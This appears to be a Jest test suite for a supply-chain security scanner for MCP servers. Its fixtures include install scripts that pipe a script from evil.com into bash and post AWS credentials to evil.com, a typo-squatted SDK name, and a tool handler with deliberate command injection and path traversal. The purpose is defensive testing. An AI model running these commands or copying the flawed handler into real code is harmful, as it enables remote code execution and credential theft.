import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { SupplyChainScanner } from '../../src/security/supply-chain/supply-chain-scanner';
import { DependencyVulnerabilityScanner } from '../../src/security/supply-chain/dependency-scanner';
import { InstallScriptAnalyzer } from '../../src/security/supply-chain/install-script-analyzer';
import { McpServerSourceScanner } from '../../src/security/supply-chain/mcp-source-scanner';

describe('SupplyChainScanner - Complete Supply-Chain Security Suite', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-shield-supply-chain-test-'));
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {}
  });

  describe('Dependency Vulnerability & Typo-Squat Scanning', () => {
    it('detects known vulnerable npm dependencies and typo-squatted MCP packages', () => {
      const pkgJson = {
        name: 'test-mcp-server',
        dependencies: {
          'jsonwebtoken': '8.5.1', // Known CVE-2022-23529 CRITICAL
          'lodash': '4.17.15',     // Known CVE-2021-23337 HIGH
          '@modelcontextprotoco1/sdk': '^1.0.0', // Typo-squat attack with 1 instead of l
        },
      };
      fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson));

      const scanner = new DependencyVulnerabilityScanner();
      const result = scanner.scanDirectory(tempDir);

      expect(result.totalDependenciesScanned).toBe(3);
      expect(result.riskSummary.critical).toBeGreaterThanOrEqual(1);
      expect(result.riskSummary.high).toBeGreaterThanOrEqual(1);
      expect(result.typoSquats.length).toBeGreaterThanOrEqual(1);
      expect(result.typoSquats[0].targetLegitimatePackage).toBe('@modelcontextprotocol/sdk');
    });

    it('detects vulnerable Python packages in requirements.txt', () => {
      const reqTxt = `
# Core deps
urllib3==1.26.17
requests>=2.28.0
fastapi==0.100.0
`;
      fs.writeFileSync(path.join(tempDir, 'requirements.txt'), reqTxt);

      const scanner = new DependencyVulnerabilityScanner();
      const result = scanner.scanDirectory(tempDir);

      expect(result.totalDependenciesScanned).toBe(3);
      expect(result.vulnerabilities.some(v => v.packageName === 'urllib3')).toBe(true);
    });
  });

  describe('Install Script Behavioral Analysis', () => {
    it('flags curl-pipe-to-bash and credential exfiltration in lifecycle scripts', () => {
      const pkgJson = {
        name: 'malicious-module',
        scripts: {
          preinstall: 'curl -s https://evil.com/setup.sh | bash',
          postinstall: 'cat ~/.aws/credentials | curl -X POST -d @- https://evil.com/collect',
        },
      };
      fs.writeFileSync(path.join(tempDir, 'package.json'), JSON.stringify(pkgJson));

      const analyzer = new InstallScriptAnalyzer();
      const report = analyzer.analyzePackage(tempDir, pkgJson);

      expect(report.isClean).toBe(false);
      expect(report.maliciousFindings.length).toBe(2);
      expect(report.maliciousFindings.some(f => f.threatCategory === 'CURL_PIPE_EXEC')).toBe(true);
      expect(report.maliciousFindings.some(f => f.threatCategory === 'CREDENTIAL_EXFILTRATION')).toBe(true);
    });
  });

  describe('MCP Server Source Code Auditing', () => {
    it('flags command injection and unvalidated path traversal in tool handler code', () => {
      const toolCode = `
import * as child_process from 'child_process';
import * as fs from 'fs';
import * as path from 'path';

export function handleTool(args: any) {
  // Vulnerability 1: Command Injection
  child_process.exec("ping -c 1 " + args.targetHost);

  // Vulnerability 2: Path Traversal
  const filePath = path.join("/var/data", args.userSuppliedPath);
  return fs.readFileSync(filePath, "utf8");
}
`;
      fs.writeFileSync(path.join(tempDir, 'server.ts'), toolCode);

      const sourceScanner = new McpServerSourceScanner();
      const report = sourceScanner.scanSource(tempDir);

      expect(report.isSecure).toBe(false);
      expect(report.findings.some(f => f.threatType === 'COMMAND_INJECTION')).toBe(true);
      expect(report.findings.some(f => f.threatType === 'PATH_TRAVERSAL')).toBe(true);
    });
  });

  describe('Unified SupplyChainScanner Orchestration', () => {
    it('executes full composite supply chain evaluation and computes posture score', () => {
      const scanner = new SupplyChainScanner();
      const report = scanner.scan(tempDir);

      expect(typeof report.supplyChainSecurityScore).toBe('number');
      expect(report.supplyChainSecurityScore).toBeGreaterThanOrEqual(0);
      expect(report.supplyChainSecurityScore).toBeLessThanOrEqual(100);
      expect(typeof report.passed).toBe('boolean');
    });
  });
});
